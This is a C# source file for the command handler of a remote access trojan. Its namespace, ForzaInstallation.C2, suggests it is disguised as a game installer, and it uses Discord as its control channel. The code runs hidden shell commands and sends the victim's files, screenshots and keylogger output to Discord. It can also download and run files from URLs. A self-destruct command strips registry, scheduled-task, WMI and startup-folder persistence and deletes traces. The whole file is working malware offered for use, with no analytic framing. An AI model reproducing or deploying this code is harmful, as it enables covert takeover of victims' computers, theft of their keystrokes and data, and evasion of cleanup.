using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace ForzaInstallation.C2
{
    internal class CommandHandler
    {
        private DiscordGateway _gw;
        private static string _installPath;

        internal CommandHandler(DiscordGateway gw, string token, string channelId, string webhookUrl)
        {
            _gw = gw;
        }

        internal static void SetInstallPath(string path)
        {
            _installPath = path;
        }

        internal static string GetHelpText()
        {
            return "=== RAT Commands ===\n"
                + "!shell <cmd>          Execute command via cmd.exe\n"
                + "!upload <path>        Upload file from target to Discord (accepts: file path)\n"
                + "!download <url>       Download file from URL to target (accepts: http/https URL)\n"
                + "!install <path>       Execute file on target (accepts: file path)\n"
                + "!screenshot           Capture screen and upload\n"
                + "!keylog               Get current keylog and start fresh recording\n"
                + "!kill                 Self-destruct: remove all traces and exit\n"
                + "!help                 Show this message";
        }

        internal string Execute(string content)
        {
            if (!content.StartsWith("!")) return null;
            var line = content.Substring(1).Trim();
            var spaceIdx = line.IndexOf(' ');
            var cmd = spaceIdx > 0 ? line.Substring(0, spaceIdx).ToLower() : line.ToLower();
            var args = spaceIdx > 0 ? line.Substring(spaceIdx + 1) : "";

            switch (cmd)
            {
                case "shell": return ExecShell(args);
                case "upload": return UploadFile(args);
                case "download": return DownloadUrl(args);
                case "install": return InstallFile(args);
                case "screenshot": return TakeScreenshot();
                case "keylog": return GetKeylog();
                case "help": return GetHelpText();
                case "kill": return SelfDestruct();
                default: return "Unknown: " + cmd + ". Type !help for available commands.";
            }
        }

        internal void SendReply(string text)
        {
            if (string.IsNullOrEmpty(text)) text = "(no output)";
            if (text.Length > 1950) text = text.Substring(0, 1950) + "\n... (truncated)";
            _gw.SendChannelMessage("```\n" + text + "\n```");
        }

        private string ExecShell(string cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi))
                {
                    var outStr = p.StandardOutput.ReadToEnd();
                    var errStr = p.StandardError.ReadToEnd();
                    p.WaitForExit(30000);
                    var result = outStr + errStr;
                    return string.IsNullOrEmpty(result) ? "(no output)" : result;
                }
            }
            catch (Exception ex) { return "(error: " + ex.Message + ")"; }
        }

        private string UploadFile(string path)
        {
            if (!File.Exists(path)) return "File not found: " + path;
            try
            {
                var data = File.ReadAllBytes(path);
                string filename = Path.GetFileName(path);
                _gw.SendFile(filename, data);
                return "Uploaded: " + filename + " (" + data.Length + " bytes)";
            }
            catch (Exception ex) { return "Upload error: " + ex.Message; }
        }

        private string DownloadUrl(string url)
        {
            try
            {
                string ext = ".exe";
                try
                {
                    string uext = Path.GetExtension(new Uri(url).LocalPath);
                    if (!string.IsNullOrEmpty(uext)) ext = uext;
                }
                catch { }
                string dest = Path.Combine(Path.GetTempPath(), "dl_" + Guid.NewGuid().ToString().Substring(0, 8) + ext);
                using (var wc = new WebClient()) { wc.DownloadFile(url, dest); }
                if (File.Exists(dest))
                    return "Downloaded to: " + dest + " (" + new FileInfo(dest).Length + " bytes)";
                return "Download failed: " + url;
            }
            catch (Exception ex) { return "Download error: " + ex.Message; }
        }

        private string InstallFile(string path)
        {
            if (!File.Exists(path)) return "File not found: " + path;
            try
            {
                var psi = new ProcessStartInfo(path)
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                var p = Process.Start(psi);
                return "Executed: " + Path.GetFileName(path) + " (PID: " + (p != null ? p.Id.ToString() : "?") + ")";
            }
            catch (Exception ex) { return "Install error: " + ex.Message; }
        }

        private string TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                    string path = Path.Combine(Path.GetTempPath(), "sc_" + Guid.NewGuid().ToString().Substring(0, 8) + ".png");
                    bmp.Save(path, ImageFormat.Png);
                    var data = File.ReadAllBytes(path);
                    try { File.Delete(path); } catch { }
                    _gw.SendFile("screenshot.png", data);
                    return "Screenshot sent (" + data.Length + " bytes)";
                }
            }
            catch (Exception ex) { return "Screenshot error: " + ex.Message; }
        }

        private string GetKeylog()
        {
            try
            {
                string logPath = Payloads.Keylogger.GetLogs();
                if (logPath == null || !File.Exists(logPath))
                    return "No keylog data available";
                var data = File.ReadAllBytes(logPath);
                try { File.Delete(logPath); } catch { }
                _gw.SendFile("keylog.txt", data);
                return "Keylog sent (" + data.Length + " bytes)";
            }
            catch (Exception ex) { return "Keylog error: " + ex.Message; }
        }

        private string SelfDestruct()
        {
            try
            {
                Payloads.Keylogger.Stop();
                WebhookLogger.Send("kill", "ATTEMPT", "removing persistence");
                Persistence.RegistryRun.RemoveAll();
                Persistence.ScheduledTask.RemoveAll();
                Persistence.WmiSubscription.Remove();
                Persistence.StartupFolder.Remove();
                if (!string.IsNullOrEmpty(_installPath))
                {
                    try
                    {
                        if (File.Exists(_installPath))
                        {
                            File.Delete(_installPath);
                            WebhookLogger.Send("kill", "PASS", "deleted: " + _installPath);
                        }
                    }
                    catch { }
                }
                try
                {
                    string klPath = Payloads.Keylogger.GetLogPath();
                    if (klPath != null && File.Exists(klPath)) File.Delete(klPath);
                }
                catch { }
                WebhookLogger.Send("kill", "PASS", "self-destruct complete");
            }
            catch (Exception ex)
            {
                WebhookLogger.FallbackLogDirect("SelfDestruct error: " + ex.Message);
            }
            Environment.Exit(0);
            return "Self-destructing...";
        }
    }
}
